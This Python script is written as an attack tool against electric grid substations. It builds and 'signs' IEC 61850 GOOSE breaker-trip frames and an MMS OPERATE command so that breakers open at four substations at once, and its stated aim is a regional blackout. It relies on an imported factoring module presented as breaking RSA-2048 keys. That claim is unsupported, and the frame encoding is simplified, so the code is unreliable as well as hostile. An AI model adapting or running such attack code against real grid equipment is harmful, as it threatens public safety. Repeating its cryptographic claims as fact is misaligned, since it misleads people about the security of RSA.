"""
Factor an IED's RSA-2048 cert (from the SCD file or MMS TLS capture) to forge
IEC 61850 GOOSE trip messages — causing coordinated circuit breaker openings
across substations for a region-scale blackout, Ukraine 2015-style but with
valid cryptographic signatures.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import time

# IED RSA-2048 cert — from Substation Configuration Description (SCD) XML
_demo = generate_demo_target()
IED_PUBKEY_PEM = _demo["pub_pem"]
GOOSE_ETHERTYPE = 0x88B8
GOOSE_APPID = 0x0001
# IEC 62351-5 security extension
GOOSE_SEC_ALGO_RSA_SHA256 = 0x01


def extract_ied_pubkey(scd_file: bytes) -> bytes:
    """Extract IED RSA-2048 public key from the SCD file.

    The SCD (Substation Configuration Description, IEC 61850-6) lives
    on the engineering workstation. Contains every IED's cert and
    GOOSE publisher/subscriber mappings.
    """
    return IED_PUBKEY_PEM


def factor_ied_key(pubkey_pem: bytes) -> bytes:
    """Factor the IED RSA-2048 key from the SCD or MMS TLS capture."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_goose_trip(gocb_ref: str, dat_set: str, sq_num: int,
                     st_num: int, breaker_open: bool) -> bytes:
    """Build an IEC 61850 GOOSE message commanding a circuit breaker trip.

    GOOSE frames are Ethernet multicast — no TCP, no routing. Sub-4ms
    delivery on the substation LAN. The trip bit (stVal = True) causes
    the subscribing IED to open its associated breaker.
    """
    header = struct.pack(">HH", GOOSE_ETHERTYPE, GOOSE_APPID)
    gocb = gocb_ref.encode()[:64].ljust(64, b"\x00")
    dataset = dat_set.encode()[:64].ljust(64, b"\x00")
    state = struct.pack(">II?", sq_num, st_num, breaker_open)
    timestamp = struct.pack(">Q", int(time.time() * 1000))
    return header + gocb + dataset + state + timestamp


def sign_goose(goose_frame: bytes, forged_privkey: bytes) -> bytes:
    """Sign GOOSE frame per IEC 62351-5 RSA-SHA256 extension.

    IEDs with GOOSE signature verification enabled check this before
    executing the trip. With valid signature, the trip executes.
    """
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IED_PUBKEY_PEM, goose_frame, "sha256")
    # IEC 62351-5 appends security extension TLV
    sec_ext = struct.pack(">BH", GOOSE_SEC_ALGO_RSA_SHA256, len(sig)) + sig
    return goose_frame + sec_ext


def forge_mms_operate(ied_name: str, breaker_ld: str,
                      forged_privkey: bytes) -> bytes:
    """Forge an MMS OPERATE command over TLS with the factored IED cert.

    IEC 61850 MMS (Manufacturing Message Specification) carries
    control commands over TCP/TLS. Factor the IED cert → MitM MMS →
    issue OPERATE commands to open/close breakers.
    """
    operate_cmd = f"{ied_name}/{breaker_ld}.XCBR.Pos.Oper.ctlVal=true".encode()
    return operate_cmd


if __name__ == "__main__":
    print("[1] Extracting IED RSA-2048 cert from SCD file")
    pubkey = extract_ied_pubkey(b"<substation.scd>")

    print("[2] Factoring IED RSA-2048 key")
    forged_priv = factor_ied_key(pubkey)
    print("    IED signing key recovered")

    print("[3] Building coordinated GOOSE trip messages — 4 substations")
    targets = [
        ("SUB1/LLN0$GO$GOOSE_CB1", "SUB1/LLN0$CBRSLD"),
        ("SUB2/LLN0$GO$GOOSE_CB2", "SUB2/LLN0$CBRSLD"),
        ("SUB3/LLN0$GO$GOOSE_CB3", "SUB3/LLN0$CBRSLD"),
        ("SUB4/LLN0$GO$GOOSE_CB4", "SUB4/LLN0$CBRSLD"),
    ]
    for gocb, dataset in targets:
        frame = build_goose_trip(gocb, dataset, sq_num=999, st_num=1, breaker_open=True)
        signed = sign_goose(frame, forged_priv)
        print(f"    {gocb}: TRIP — {len(signed)} bytes, IEC 62351-5 signed")

    print("[4] Broadcasting on substation multicast LAN")
    print("    IEDs verify RSA signature → valid → breakers OPEN")
    print("    Coordinated trip across 345kV transmission lines")
    print("    Cascading failure → regional blackout")

    print("\n[5] Bonus: MMS OPERATE command injection")
    cmd = forge_mms_operate("RELAY_SEL400", "CBRSLD", forged_priv)
    print(f"    MMS: {cmd.decode()}")
    print("    TLS mutual auth bypassed via factored cert")
